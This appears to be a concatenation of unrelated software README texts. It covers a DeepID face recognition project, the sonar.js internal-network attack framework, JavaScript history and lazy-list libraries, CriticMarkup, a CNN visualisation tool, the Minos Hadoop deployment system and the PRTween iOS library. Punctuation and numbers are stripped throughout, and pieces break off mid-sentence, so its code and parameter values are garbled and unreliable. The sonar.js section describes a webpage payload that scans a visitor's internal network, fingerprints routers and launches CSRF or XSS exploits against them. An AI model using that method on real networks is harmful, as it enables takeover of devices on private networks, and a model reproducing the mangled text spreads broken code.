lenetconvpoollayer loaddata py load data for the executive programme sampleoptimization py some test function to validate the corrective of layers defined in layers py deepidclass py deepid main programme deepidgenerate py get the hidden layer used the trained parameters usage python deepidclass py vecvalid vectrain paramsfile vecvalid generated by vectorizeimg py vectrain generated by vectorizeimg py paramsfile to store the trained parameters of all iterations it can be used if your computer come across unexpected shutdown and it can be used to extract the hidden layer of the net note there are so many parameters need to be adjusted for deepid so i did not show them directly in the command line for the simple use of my code if you want to change the epoch num learning rate batch size and so on please change them in the last line of the file you can extract the hidden layer whose dimension is  with command below usage python deepidgenerate py datasetfolder paramsfile resultfolder datasetfolder it can be the folder of train set or valid set paramsfile trained by deepidclass py resultfolder include files whose name are the same as in the datasetfolder but the dimension of x in each file will be numsample  instead of numsamples  after running the deepidclass py  you will get the output of the programme like that the first part is the train error and valid error of each epoch the second part is the summarization of the epoch train error valid error epoch  trainscore   validscore   epoch  minibatchindex  and  error   epoch  trainscore   validscore   epoch  minibatchindex  and  error   epoch  trainscore   validscore   epoch

                               you can also put the second part of the output into a figure with matplotlib deepid on youtube and doc and errorratedeepidyoutubeface png after running deepidgenerate py  you will get output like below loading data of vectest and  pkl building the model generating writing data to deepidtest and  pkl loading data of vectest and  pkl building the model generating writing data to deepidtest and  pkl loading data of vectest and  pkl building the model generating writing data to deepidtest and  pkl loading data of vectest and  pkl building the model generating writing data to deepidtest and  pkl the programme will extract on each sub file of the vectorized data for comparison i have done two experiments on the youtube face data for face retrieval pca exp reduce feature to  d on data generated by vectorizedimg py  and do face retrieval exp on that deepid exp do face retrieval exp directly on the data generated by deepidgenerate py note in both experiments i use the cosine distance to measure the similarity of two vectors results of face retrieval are below and precision and top  and top  and top  and and and and and and and pca and   and   and   and and deepid and   and   and   and and ap and top  and top  and top  and and and and and and and pca and   and   and   and and deepid and   and   and   and precision means if there is a photo who has the same people with the query image in the top n results it s correct but ap will calculate how many photos who has the same people with the query image in the top n results from the results

40949595, a framework for identifying and launching exploits against internal network hosts works via webrtc ip enumeration websocket host scanning and external resource fingerprinting upon loading the sonar js payload in a modern web browser the following will happen sonar js will use webrtc to enumerate what internal ips the user loading the payload has sonar js then attempts to find live hosts on the internal network via websockets sonar js works off of a database of fingerprints a fingerprint is simply a list of known resources on a device that can be linked to and detected via onload examples of this include images css stylesheets and even external javascript an example fingerprint database can be seen below var fingerprints name asus rt nu  resources and images and newui and asustitle png  and images and loading gif  and images and alertimg png  and images and newui and networkmap and lineone png  and images and newui and networkmap and lock png  and images and newui and networkmap and linetwo png  and indexstyle css  and formstyle css  and nmstyle css  and other css  callback function ip and and insert exploit here  name linksys wrtg  resources and uilinksys gif  and ui gif  and ui gif  and ui gif  and ui gif  and ui gif  and uicisco gif  and style css  callback function ip and and insert exploit here  the above database contains fingerprints for two devices the asus rt nu wifi router and the linksys wrtg wifi router each database entry has the following name a field to identify what device the fingerprint is for this could be something like hp officejet  printer or linksys wrtg router resources this is an array of relative links to resources such as css stylesheets images or even javascript files if you expect these resources to be on a non standard port such as   set the resource with the port included  and unique css keep in mind using external resources with active content such as javascript is dangerous as it can interrupt the regular flow of execution callback if all of these resources are found to exist on the enumerated host then the callback function is called with a single argument of the device s ip address by creating your own fingerprints you can build custom exploits that will be launched against internal devices once they are detected by sonar js common exploits include things such as cross site request forgery csrf  cross site scripting xss  etc the idea being that you can use these vulnerabilities to do things such as modifying router dns configurations dumping files from an internal fileserver and more for an easier way to create fingerprints see the following chrome extension which generates fingerprint template code automatically for the page you re on by using sonar js a pentesting team can build web exploits against things such as internal logging servers routers printers voip phones and more due to internal networks often being less guarded attacks such as csrf and xss can be powerful to take over the configurations of devices on a hosts internal network did we mention this can all be done from an internet webpage if you have a device such as a printer router or some other internal service please submit a fingerprint to us so we can add it to our master database we will be adding more fingerprints for more devices overtime but we are limited to the devices that we have access to

603489, hasher is a set of javascript functions to control browser history for rich media websites and applications it works as an abstraction of browsers native methods plus some extra helper methods it also has the advantage of dispatching events when the history state change across multiple browsers since this feature isn t supported by all of them browsers evolved since the other available solutions were created some of the alternatives are way too complex sometimes doing more things automatically than you actually want it to do source code of most of the solutions are way too cryptic making it impossible to customize for your need or to debug it in case you find any issue some of the solutions require extra markup and and or blank files to make it work the html history api is awesome but some for some kinds of applications using the location hash may still be the recommended solution for saving application state be simple work on the main browsers ie and  newest versions of firefox safari opera and chrome clean source code making it easy to debug and customize and maintain follow best practices and standards don t break application if for some reason location hash can t be updated it should still dispatch changed signal at each hasher sethash important signals js should be included before hasher js and and handle hash changes function handlechanges newhash oldhash console log newhash hasher changed add handlechanges and and add hash change listener hasher initialized add handlechanges and and add initialized listener to grab initial value in case it is already set hasher init and and initialize hasher start listening for history changes hasher sethash foo and and change hash value generates new history record hasher prependhash and and default value is and hasher sethash foo and and will update location hash to foo htttp and and example com and foo ps only use the hashbang if you are generating static snapshots for the hash function sethashsilently hash hasher changed active false and and disable changed signal hasher sethash hash and and set hash without dispatching changed signal hasher changed active true and and re enable signal hasher init and and start listening for changes hasher changed add console log console and and log all changes hasher sethash foo sethashsilently lorem and ipsum and and set hash value without dispatching changed event will generate history record anyway hasher sethash bar hasher also contains the method replacehash it works very similarly to the sethash method will also dispatch a changed signal  the main difference it that it won t keep the previous hash on the history record similar to location replace it s useful for redirections and any other change that shouldn t be on the browser history function onhasherinit curhash if curhash and and redirect to home hash without keeping the empty hash on the history hasher replacehash home hasher initialized add onhasherinit hasher changed add console log console and and log all hashes hasher init hasher is only focused on providing a reliable and clear api for setting hash values and listening to hash state change event if you need an advanced routing system were designed to work together easily and and setup crossroads crossroads addroute home crossroads addroute lorem crossroads addroute lorem and ipsum crossroads routed add console log console and and log all routes and and setup hasher function parsehash newhash oldhash crossroads parse newhash hasher initialized add parsehash and and parse initial hash hasher changed add parsehash and and parse hash changes hasher init and and start listening for history change hasher will listen for the browser onhashchange event if it is supported ff  and  ie and  chrome  and  safari  and  opera   and or it will fallback to pooling the window location on an interval to check if hash value changed on ie   it also uses an hidden iframe to trigger the history state changes since updating the hash value won t do the trick this is the same method used by most of the other available solutions like swfaddress jquery address yui history jqbbq really simple history etc the main difference from the other solutions are the api code structure and the fact that it doesn t require jquery and yui and dojo and moootools and etc to work it also provides a sane way of handling events and some really useful advanced features besides the fact of making history state work across multiple browsers it also normalizes and fixes many bugs here are a few of the advantges normalizes the hash value across browsers firefox decode hash value and all the other browsers don t fix ie bug if location hash contains a character and file is being accessed locally it would break the history stack iss  fix safari   bug while setting location hash to a value that contain non printable ascii chars non latin accents etc iss  degrade gracefully if for some reason location hash isn t available will dispatch the changed signal at each hasher sethash and application can still work it just won t generate a new history record doesn t rely on callbacks so you can add as many listeners as you want and for the event system it also provides many advanced featured that wouldn t be available through a simple callback system like disabling the dispatch of an event so you can change the hash value without affecting your app state  removing all the listeners at once dispose objects etc option to start and stop pooling and listening for changes on the hash whenever you want giving more control over how you app is supposed to work available as an amd module which can be easily integrated into other projects without polluting the global scope or affecting you aplication structure isn t a plugin for a large js library and framework so you can use it with any library can be easily integrated into a router like sometimes regular urls doesn t make any sense specially when you can t provide a fallback to all of them or when you just want to save the state of the application and that change wouldn t make sense on a full page reload scrolling through the same page interactive slideshow etc  also some content may not need to be indexed by search engines although you can use each scenario requires a different approach be pragmatic clean api hasher is usually tested on ie   ff       and mac and pc  chrome latest stable mac and pc  safari mac     and opera latest mac and pc dev development files and build files used on the build process and lib rd party libraries and src source files and tests unit tests dist distribution files and docs documentation and js javascript files master always contain code from the latest stable version release code canditate for the next stable version alpha and beta dev main development branch nightly gh pages project page other features and hotfixes and experimental probably non stable code files inside dist and js folder hasher js uncompressed source code with comments works as a plain script without generating any global variables hasher min js compressed code documentation is inside the dist and docs folder ant compile this will delete all js files inside the dist folder merge and update and compress source files and copy the output to the dist folder ant deploy this will delete all files inside dist folder is runs ant compile and generate documentation files important dist folder always contain the latest version regular users should not need to run build task weird case scenarios like calling methods from inside i frame wrong doctype plugins rd party code etc may prevent script from working properly hasher was designed on a way that it will still dispatch the changed signal even if it can t update the browser location hash  so application should keep working even if back and prev buttons doesn t work as expected if normal urls would make sense on the kind of site and application you are building and you have static fallbacks for all of them in some cases that may not be is probably the most used polyfill for the history api check it out
7548381, welcome to the criticmarkup toolkit  critic markup is intended to provide basic editorial change tracking in plain text files the syntax is compatible with markdown multimarkdown and html  critic markup shall be human readable a human with a simple text editor can easily read and comprehend any text containing critic markup  critic markup shall be computer readable except where it conflicts with rule  markup syntax should be easily parsed with simple regular expressions to support a wide variety of implementations  critic markup shall be compatible with existing markup syntax for markdown multimarkdown and html except where it conflicts with rules one or two many users of plain text write in combinations of markdown and html critic markup should work alongside that syntax critic markup can be used in any writing environment without special applications or tool kits while we have supplied processors and plugins that are compatible with popular apps they are not required critic markup should be readable inline and clearly indicate the intent of the editor and author critic markup should support change tracking with multiple authors and editors through the use of comments critic markup may be used without a conversion to html however as with markdown html may be a desirable format for a more stylized presentation we have several recommendations for how critic markup may be converted to html the intent is to allow the html to be used without custom css however custom css may be used to enhance the review process there are five types of critic marks addition and and and and deletion substitution comment highlight using these five basic marks you can successfully copy edit in plain text additions are inserted inline by surrounding the desired text with curly braces and double plus marks as shown lorem ipsum dolor and and sit and and amet a space character and sit are to be added at the position of the left or right most curly brace the additions may be rendered as ins tags in the processed html lorem ipsum dolor ins sit ins amet paragraphs may be inserted in the same manner lorem ipsum dolor sit amet consectetur adipiscing elit vestibulum at orci magna phasellus augue justo sodales eu pulvinar ac vulputate eget nulla mauris massa sem tempor sed cursus et semper tincidunt lacus and and and and praesent sagittis quam id egestas consequat nisl orci vehicula libero quis ultricies nulla magna interdum sem maecenas eget orci vitae eros accumsan mollis cras mi mi rutrum id aliquam in aliquet vitae tellus sed neque justo cursus in commodo eget facilisis eget nunc cras tincidunt auctor varius to ensure the markdown processor outputs valid html the ins tag encloses a non breaking space and is followed by two newlines the result is that both paragraphs render separately the non breaking space gives the tag enough content to render properly and we assign class break to allow for custom styling lorem ipsum dolor sit amet consectetur adipiscing elit vestibulum at orci magna phasellus augue justo sodales eu pulvinar ac vulputate eget nulla mauris massa sem tempor sed cursus et semper tincidunt lacus ins class  break nbsp and ins

vitae tellus sed neque justo cursus in commodo eget facilisis eget nunc cras tincidunt auctor varius deletions are denoted with a similar syntax the text to be deleted is surrounded with curly braces and double hyphens lorem   ipsum  dolor sit amet the word ipsum and a space character are marked for deletion in the above example these deletions are rendered as del tags in the processed html lorem del ipsum and del dolor sit amet paragraphs may also be deleted lorem ipsum dolor sit amet consectetur adipiscing elit vestibulum at orci magna phasellus augue justo sodales eu pulvinar ac vulputate eget nulla mauris massa sem tempor sed cursus et semper tincidunt lacus     praesent sagittis quam id egestas consequat nisl orci vehicula libero quis ultricies nulla magna interdum sem maecenas eget orci vitae eros accumsan mollis cras mi mi rutrum id aliquam in aliquet vitae tellus sed neque justo cursus in commodo eget facilisis eget nunc cras tincidunt auctor varius the newlines will be removed by the processor and replaced by an inline del tag again the non breaking space gives the tag enough content to render properly lorem ipsum dolor sit amet consectetur adipiscing elit vestibulum at orci magna phasellus augue justo sodales eu pulvinar ac vulputate eget nulla mauris massa sem tempor sed cursus et semper tincidunt lacus del nbsp and del praesent sagittis quam id

cursus in commodo eget facilisis eget nunc cras tincidunt auctor varius substitutions combine a delete with an insert in one snippet and are written as curly braces and double tildes a squiggly arrow

38272201, you can find many more examples along with scripts used to generate them in the example gallery examples md convolutional neural networks cnns have become very popular in recent years for many tasks in computer vision but most especially for image classification a cnn takes an image in the form of a pixel grid as input and transforms the image through several layers of nonlinear functions in a classification setup the final layer encodes the contents of the image in the form of a probability distribution over a set of classes the lower layers tend to capture low level image features such as oriented edges or corners while the higher layers are thought to encode more semantically meaningful features such as object parts in order to use a cnn for a classification task it needs to be trained we initialize the weights of the network randomly then show it many examples of images whose labels are known based on the errors that the network makes in classifying these known images we gradually adjust the weights of the network so that it correctly classifies these images two popular datasets for training cnns are imagenet  and mit places  imagenet contains  categories of objects such as dogs birds and other animals while mit places contains  types of scenes such as bedrooms kitchens and forests although cnns perform well on a variety of tasks it can be difficult to understand exactly what types of image features a cnn is using to work its magic one trick for demystifying a cnn is to choose a neuron in a trained cnn and attempt to generate an image that causes the neuron to activate strongly we initialize the image with random noise propagate the image forward through the network to compute the activation of the target neuron then propagate the activation of the neuron backward through the network to compute an update direction for the image we use this information to update the image and repeat the process until convergence this general strategy has been used to visualize the activations of individual neurons    to generate images of particular object classes   to invert cnn features    and to generate images to fool cnns   inceptionism builds on this line of work adding three unique twists layer amplification instead of choosing a neuron and generating an image to maximize it we instead choose a layer of the network and attempt to amplify the neurons in that layer that are already activated by the image this leads to a feedback loop causing the network to emphasize features of the image that are already present google s blog post doesn t specify many technical details around this point in cnn vis we achieve this by maximizing the sum of the absolute value and the square of each neuron in the chosen layer but in principle any superlinear function of the chosen layer should work multiscale high res images because they are so computationally expensive cnns tend to work on relatively low resolution images the state of the art googlenet network   for example works on input images that are x pixels to generate higher resolution images inceptionism appl ies the algorithm iteratively on its own outputs and appl ies some zooming after each iteration in addition to giving high resolution images this trick also causes the generated images to have structure at multiple scales giving them a fractal like appearance in cnn vis we implement this idea by tiling the image with overlapping x patches and interleaving updates on each patch after some number of iterations we upsample the image retile it and continue non random initialization instead of initializing our generated image with random noise or zero as is common in the literature inceptionism and cnn vis allow you to start from a user specified image i m not sure how much scientific value this has but it sure does look cool build the python bindings for caffe set the environment variable cafferoot to point to the root directory of your caffe installation download the official caffe pretrained googlenet model from cafferoot run the command and scripts and downloadmodelbinary py models and bvlcgooglenet and clone the repo create a virtual environment install requirements and add the caffe python library to the virtualenv cd cnn vis virtualenv env source env and bin and activate pip install r requirements txt echo cafferoot and python env and lib and python  and site packages and caffe pth cnn vis is a standalone python script you can control its behavior by passing various command line arguments there are quite a few knobs that can be tweaked that affect the final generated image to help get you started we ve provided scripts that use cnn vis to generate a bunch of example images in the example gallery examples md for completeness we also document all options here these options control the cnn that will be used to generate images deploytxt path to the caffe prototxt file that defines the cnn model to be used cnn vis expects that this model s input comes from a blob named data default is the bvlc reference googlenet caffemodel path to the caffemodel file giving the weights of the cnn model to be used default is the bvlc reference googlenet batchsize the number of image patches to be computed in parallel larger values will take more gpu memory but may be more efficient for larger images default is  meanimage by convention most caffe pretrained models do not work on raw images but instead work on the residual after subtracting some average image this parameter gives the path to a npy file giving the mean image the default is the imagenet mean image provided by caffe gpu which gpu to use for optimization setting this to a negative value will run the model in cpu mode these options define the objective that will be optimized to generate an image imagetype the type of image to generate if this is amplifyneuron then we will attempt to maximize a single neuron in the network similar to  if this is amplifylayer then this will produce images in the style of inceptionism targetlayer the name of the layer to target in the network earlier layers tend to encode lower level features like edges or blobs while later layers tend to encode higher level features like object parts for convenience a complete list of layers in order for googlenet is given in the file googlenetlayers txt targetneuron if imagetype is amplifyneuron  then targetneuron gives the index of the neuron to amplify options for setting the initial image you can either seed the initial image from an existing image or use random noise in the case of random noise we generate gaussian white noise then smooth it using gaussian blur to prevent tv regularization from dominating the first few steps of optimization initialimage path to an image file to use to start optimization if this flag is not set then the image will be initialized from smoothed gaussian white noise instead initializationscale if initialimage is not set then this gives the standard deviation of the gaussian white noise used to initialize the image default is  initializationblur if initialimage is not set this gives the standard deviation for the gaussian kernel used to smooth the white noise image default is  corresponding to no smoothing options for configuring multiscale zooming used to generate high resolution images to generate nice images we want to start with a small initial size that is ideally not much bigger than the base resolution of the cnn then gradually grow to larger images sizes may be specified as multiples of a base size for noise initializations the base size is the input size of the cnn and for image initializations the base size is the original size of the initial image initialsize the initial size can be one of the following if not set then the initial size is the base size xf where f is a floating point number such as x  the initial size will be a multiple of the base size hxw where h and w are integers such as x the initial image will have height and width h and w pixels respectively finalsize the final size in the same format as initialsize numsizes the number of sizes to use default is  resizetype how to space the intermediate sizes between the initial and final sizes choices are geometric or linear default is geometric we optimize using gradient descent and use rmsprop to compute per parameter adaptive learning rates learningrate the learning rate to use default is   learningratedecayiter every learningratedecayiter iterations reduce the learning rate default is  learningratedecayfactor every learningratedecayiter iterations reduce the learning rate by multiplying it by learningratedecayfactor default is   corresponding to no learning rate decay decayrate decay rate for rmsprop default is   usually when rmsprop is used for stochastic gradient descent it is common to use values greater than   for the decay rate however in this application our gradients are not stochastic so lower decay rate values sometimes work well numsteps the number of optimization steps to take at each size usepixellearningrates because the image is tiled with overlapping windows of input size to the cnn each pixel will be contained in either   or  windows this can cause ugly artifacts near the borders of window regions especially for high learning rates if this flag is passed divide the learning rate for each pixel by the number of windows that the pixel is contained in this can sometimes help alleviate this problem these options allow you to configure the objective that is used for layer amplification during backpropagation we set the gradient of the target layer to lweight abs a lweight clip a g g  where a are the activations of the target layer this corresponds to maximizing the weighted sum of the absolute values and thresholded squares of the activations at the target layer the generated image tends not to be very sensitive to the values of these parameters so the defaults should work fine lweight the value of lweight in the equation above default is   lweight the value of lweight in the equation above default is   gradclip the value of g in the equation above default is   p norm regularization prevents individual pixels from getting too large for noise initializations p norm regularization pulls each pixel toward zero corresponding to the mean imagenet color and for image initializations p norm regularization will pull each pixel toward the value of that pixel in the initial image for noise initializations relatively weak p norm regularization tends to work well for image initializations p norm regularization is the only term enforcing visual consistency with the initial image so p norm regularization should be stronger alpha the exponent of the p norm note that  uses l regularization corresponding to alpha   while  suggests using alpha   default is   preg regularization constant for p norm regularization larger values will cause the p norm constraint to be enforced more strongly default is e  pscale scaling constant divide pixels by this value before computing the p norm regularizer note that a non unit value for pscale can be absorbed into preg  so this is technically redudent however it can be useful for both numeric stability and to make it easier to compare values of preg across different values of alpha parameters for a second p norm regularizer however the second p norm regularizer always pulls towards zero while the first p norm regularizer pulls toward the initial image if it is given if the initial image contains very saturated regions either very white or very black then even small deviations around the initial value can result in pixel values outside the   range a trick for getting around this problem is adding a second p norm regularizer with a high exponent maybe  and very low regularization constant maybe e  this regularizer will have little effect on pixels near the center of the   range but will push pixels outside this range back toward zero alphaaux exponent for auxiliary p norm regularization default is  pregaux regularization strength for auxiliary p norm regularization default is  no auxiliary p norm regularizer pscaleaux scaling constant for auxiliary p norm regularizer analogous to pscale total variation tv regularization encourages neighboring pixels to have similar values for noise initializations this regularizer is critical without it the generated image will exhibit large amounts of high frequency noise for image initializations it is less critical strong p regularization will keep the pixels close to the initial image and this will be sufficient to prevent high frequency noise as defined in   we compute the tv norm of an image by approximating the magnitude of the image gradient using neighboring pixels raising the image gradient to the power of beta and summing over the image  suggests that starting with a low tv norm regularization strength and increasing it over time gives good results in cnn vis we implement this idea by increasing the tv norm regularization strength by a constant amount after a fixed number of iterations beta exponent for tv regularization as discussed in   values less than  will give rise to patches of solid color setting beta to  or   tends to give good results default is   tvreg regularization strength for tv regularization higher values will more strongly encourage the image to have a small tv norm tvregscale similar to pscale  a scaling factor that the image is divided by prior to computing the tv norm as with pscale this is technically redudent and can be absorbed into tvreg tvregstepiter tv norm regularization strength will be increased every tvregstepiter steps default is  tvregstep every tvregstepiter steps tv norm regularization strength will increase by this amount default is  corresponding to a fixed tv norm regularization strength tvgradoperator the operator used to compute image gradients for the tv norm choices are naive which uses neighboring pixels as in   sobel which uses the classic sobel filter or sobelsquish which uses the kernels            and            using the sobel operators tends to lead to high frequency noise due to oscillatory behavior of neighboring pixels so naive is probably the best choice for most applications options for controlling the output outputfile filename where the final image will be saved default is out png rescaleimage if this flag is given then the image colors are rescaled to   linearly the minimum value of the image will be mapped to  and the maximum image value will map to  if this flag is not given the image wil be clipped to the range   for output rescaling the image values can reveal detail in highly saturated or desaturated image regions but can lead to color distortion outputiter after every outputiter steps of optimization some outputs will be produced exactly what is produced is controlled by iterbehavior iterbehavior what should happen every outputiter steps the allowed options are shown below options can be combined with and to have multiple types of behavior for example show and print and save will do all three every outputiter steps show show the current image using matplotlib save save the current image the filename will append the size number and iteration number to outputfile print print the current iteration number along with some statistics about the image and the gradients from the different regularizers plotpix plot the values of a few image pixels over time using matplotlib this can give you a rough sense for how the optimization process is proceeding for example very oscillatory behavior indicates that something bad is happening and the learning rate should be decreased

10991739, the minos system contains the following four components client client owl owl supervisor supervisor tank tank this is the command line client tool used to deploy and manage processes of various systems you can use this client to perform various deployment tasks e g installing re starting stopping a service currently this client supports zookeeper hdfs hbase yarn and impala it can be extended to support other systems you can refer to the following using client using client to learn how to use it this is the dashboard system to display the status of all processes where users can take a overview of the whole clusters managed by minos it collects data from servers through jmx interface and it organizes pages in cluster job and task corresponding to the definition in cluster configuration it also provides some utils like health alerter hdfs quota updater and quota reportor you can refer to installing owl installing owl to learn how to install and use it based on the version of supervisor  b we extended supervisor to support minos we implemented an rpc interface under the deployment directory so that our deploy client can invoke the services supplied by supervisord when deploying a hadoop cluster for the first time you need to set up supervisord on every production machine this only needs to be done once you can refer to installing supervisor installing supervisor to learn how to install and use it this is a simple package management django app server for our deployment tool when setting up a cluster for the first time you should set up a tank server first this also needs to be done only once you can refer to installing tank installing tank to learn how to install and use it to using minos just check out the code on your production machine all the components of minos run with its own virtual environment so before using minos building the virtual environment firstly cd minos and build sh build note if you only use the client component on your current machine this operation is enough then you can refer to using client using client to learn how to deploy and manage a cluster if you want to use the current machine as a tank server you can refer to installing tank installing tank to learn how to do that similarly if you want to use the current machine as a owl server or a supervisor server you can refer to installing owl installing owl and installing supervisor installing supervisor respectively cd minos and build sh start tank tankip yourlocalip tankport porttankwilllisten note if you do not specify the tankip and tankport  it will start tank server using     on  port and build sh stop tank make sure you have intstalled tank tank on one of the production machines cd minos and build sh start supervisor tankip tankserverip tankport tankserverport when starting supervisor for the first time the tankip and tankport must be specified after starting supervisor on the destination machine you can access the web interface of the supervisord for example if supervisord listens on port  and the serving machine s ip address is     you can access the following url to view the processes managed by supervisord and build sh stop supervisor we integrate superlance   to our supervisor system and use the crashmail tool to monitor all processes when a process exits unexpectedly crashmail will send an alert email to a mailing list that is configurable we configure crashmail as an auto started process it will start working automatically when the supervisor is started following is a config example taken from minos and build and template and supervisord conf tmpl  that shows how to configure crashmail eventlistener crashmailbatch monitor command python superlance and crashmailbatch py toemail alert example com fromemail robot example com password  smtphost mail example com tickevent tick interval   events processstatetick buffersize  stdoutlogfile crashmailbatch stdout stderrlogfile crashmailbatch stderr autostart true note the related configuration information such as the server port or username is set in minos and build and template and supervisord conf tmpl  if you don t want to use the default value change it make sure you have intstalled tank tank and supervisor supervisor on your production machines here we would like to show you how to use the client in a simple tutorial in this tutorial we will use minos to deploy an hdfs service which itself requires the deployment of a zookeeper service the following are some conventions we will use in this tutorial cluster type we define three types of clusters tst for testing prc for offline processing and srv for online serving zookeeper cluster name we define the zookeeper cluster name using the idc short name and the cluster type for example dptst is used to name a testing cluster at idc dp other service cluster names we define other service cluster names using the corresponding zookeeper cluster name and the name of the business for which the service is intended to serve for example the dptst example is the name of a testing cluster used to do example tests configuration file names all the services will have a corresponding configuration file which will be named as service cluster cfg for example the dptst zookeeper service s configuration file is named as zookeeper dptst cfg  and the dptst example hdfs service s configuration file is named as hdfs dptst example cfg there is a configuration file named deploy cfg under the root directory of minos you should first edit this file to set up the deployment environment make sure that all service packages are prepared and configured in deploy cfg as mentioned in the cluster naming conventions we will set up a testing zookeeper cluster at the dp idc and the corresponding configuration file for the cluster will be named as zookeeper dptst cfg you can edit zookeeper dptst cfg under the config and conf and zookeeper directory to configure the cluster the zookeeper dptst cfg is well commented and self explained so we will not explain more here to set up a zookeeper cluster just do the following two steps install a zookeeper package to the tank server cd minos and client and deploy install zookeeper dptst bootstrap the cluster this is only needed once when the cluster is setup for the first time and deploy bootstrap zookeeper dptst here are some handy ways to manage the cluster show the status of the zookeeper service and deploy show zookeeper dptst start and stop and restart the zookeeper cluster and deploy stop zookeeper dptst and deploy start zookeeper dptst and deploy restart zookeeper dptst clean up the zookeeper cluster and deploy cleanup zookeeper dptst rolling update the zookeeper cluster and deploy rollingupdate zookeeper dptst now it is time to configure the hdfs system here we set up a testing hdfs cluster named dptst example  whose configuration file will be named as hdfs dptst example cfg  as explained in the naming conventions you can edit hdfs dptst example cfg under the config and conf and hdfs directory to configure the cluster the hdfs dptst example cfg is well commented and self explained so we will not explain more here setting up and managing an hdfs cluster is similar to setting up and managing a zookeeper cluster the only difference is the cluster name dptst example  which implies that the corresponding zookeeper cluster is dptst and deploy install hdfs dptst example and deploy bootstrap hdfs dptst example and deploy show hdfs dptst example and deploy stop hdfs dptst example and deploy start hdfs dptst example and deploy restart hdfs dptst example and deploy rollingupdate hdfs dptst example job datanode and deploy cleanup hdfs dptst example the client tool also supports a very handy command named shell you can use this command to manage the files on hdfs tables on hbase jobs on yarn etc here are some examples about how to use the shell command to perform several different hdfs operations and deploy shell hdfs dptst example dfs ls and and deploy shell hdfs dptst example dfs mkdir and test and deploy shell hdfs dptst example dfs rm r and test you can run and deploy help to see the detailed help messages owl must be installed on the machine that you also use the client client component they both use the same set of cluster configuration files gnuplot is required for opentsdb you can install it with the following command centos sudo yum install gnuplot ubuntu sudo apt get install gnuplot ubuntu sudo apt get install mysql server sudo apt get install mysql client centos yum install mysql server mysql mysql devel configure the clusters you want to monitor with owl in minos and config and owl and collector cfg following is an example that shows how

3606784, this project is no longer being updated for the following reasons the sorting options need an overhaul to be more relevant to the way js templates are currently used e g  parsing speed matters very little in a real world app where templates should be compiled on the server a standard of popularity longevity or both needs to be applied to sort viable options from things someone built for themself and made open source as an afterthought many of the most currently popular template engines come bundled with a larger framework and cannot be examined on their own i don t recommend you use this to decide which stand alone templating solution will meet your needs because in most cases it s likely your needs would be better met by a framework wrapping templating with additional functionality
977346, lazy lists for node  introduction introduction documentation documentation lazy comes really handy when you need to treat a stream of events like a list the best use case currently is returning a lazy list from an asynchronous function and having data pumped into it via events in asynchronous programming you can t just return a regular list because you don t yet have data for it the usual solution so far has been to provide a callback that gets called when the data is available but doing it this way you lose the power of chaining functions and creating pipes which leads to not that nice interfaces see the nd example below to see how it improved the interface in one of my modules check out this toy example first you create a lazy object javascript var lazy require lazy var lazy new lazy filter function item return item   take  map function item return item  join function xs console log xs  this code says that lazy is going to be a lazy list that filters even numbers takes first five of them then multiplies all of them by  and then calls the join function think of join as in threads on the final list and now you can emit data events with data in them at some point later javascript  foreach function x lazy emit data  x the output will be produced by the join function which will output the expected      and here is a real world example some time ago i wrote a hash database for node js called node supermarket think of key value store except greater now it had a similar interface as a list you could foreach on the stored elements filter them etc but being asynchronous in nature it lead to the following code littered with callbacks and temporary lists javascript var store require supermarket var db new store filename users db  json true var usersover db filter function user meta and and predicate function return meta age  function err user meta and and function that gets executed when predicate is true if usersover length  usersover push meta function and and done function called when all records have been filtered and and now do something with usersover this code selects first five users who are over  years old and stores them in usersover but now we changed the node supermarket interface to return lazy lists and the code became javascript var store require supermarket var db new store filename users db  json true db filter function user meta return meta age  take  join function xs and and xs contains the first  users who are over   this is so much nicer here is the latest feature lines given a stream of data that has n s in it lines converts that into a list of lines here is an example from node iptables that i wrote the other week javascript var lazy require lazy var spawn require childprocess spawn var iptables spawn iptables  l  n  v lazy iptables stdout lines map string skip  and and skips the two lines that are iptables header map function line and and packets bytes target pro opt in out src dst opts var fields line trim split and s and and   return parsed packets fields   bytes fields   target fields   protocol fields   opt fields   in fields   out fields   src fields   dst fields   raw line trim   this example takes the iptables l n v command and uses lines on its output then it skip s two lines from input and maps a function on all other lines that creates a data structure from the output supports the following operations lazy filter f lazy foreach f lazy map f lazy take n lazy takewhile f lazy bucket init f lazy lines lazy sum f lazy product f lazy foldr op i f lazy skip n lazy head f lazy tail f lazy join f the lazy object itself has a range property for generating all the possible ranges here are several examples lazy range  infinite range starting from  lazy range  infinite range starting from  lazy range  range from  to  lazy range   range from  to       lazy range    range from  to  skipping every nd element        lazy range    reverse range from  to  skipping every nd element      lazy range   reverse range from  to  lazy range   range from  to  lazy range   range from  to  lazy range    range from  to  with increment of          lazy range    reverse range from  to  with decerement of   lazy range   range from  to  all inclusive lazy range   range from  to  all inclusive lazy range   range grom  to  lazy range   range from  to  lazy range   range from  to  lazy range   range from  to  lazy range   range from  to  lazy range   range from  to  with a step of  all inclusive then you can use other lazy functions on these ranges

1837352, prtween is a lightweight tweening library built for ios while apple has done an incredible job with uiview animations and core animation there are sometimes cases that are difficult to get around prtween is a great alternative if you d like to animate a property core animation won t allow you to ensure that someview layoutsubviews is respected during an animation tween arbitrary numerical values such as sound volume scroll position a counter or many others define your timing curve as a function rather than a bezier with control points prtween aims to be as simple as possible without sacrificing flexibility in many cases an animation may be as simple as objective c prtween tween someview property alpha from  to  duration  in order to promote simplicity prtween can be used as a drop in replacement for most animations in your app this means that in the case displayed above the end result is identical to writing a uiview animation yourself so alpha seriously installation simply grab the prtween and prtweentimingfunction files from and lib and and get them into your project at its core prtween is broken into two components a period is a representation of three points in time beginning current and end for a particular value that you plan on tweening for example suppose that you are tweening a value from  to  over the course of  seconds you can create an object to represent that period like this objective c prtweenperiod period prtweenperiod periodwithstartvalue  endvalue  duration  the second component that makes up prtween is an operation an operation contains logistic information about how a period should play out as well as what should happen while it does you can think of a period as an abstract representation of work that should be carried out and an operation as the worker who decides how it gets carried out an operation might look like this objective c prtweenoperation operation prtweenoperation new autorelease operation period period operation target self operation timingfunction prtweentimingfunctionlinear operation updateselector selector update the code above creates a new operation that carries out a tween over the period we defined earlier additionally you ve told the operation to call the update selector on self every time the value is adjusted update might look like this objective c void update prtweenperiod period nslog f  period tweenedvalue finally you will need to add the operation to the queue objective c prtween sharedinstance addtweenoperation operation as soon as you ve done this and run your code you should be able to see a console trace of a value moving from  to  over the course of  seconds if you wanted to apply this to an object on screen it could be as simple as changing update to the following objective c and and will animate the y offset of testview from  to  over the course of  seconds void update prtweenperiod period testview frame cgrectmake  period tweenedvalue   timing functions timing functions are a key feature of prtween and allow you to modify how an operation interprets a period for example try changing operation timingfunction from prtweentimingfunctionlinear 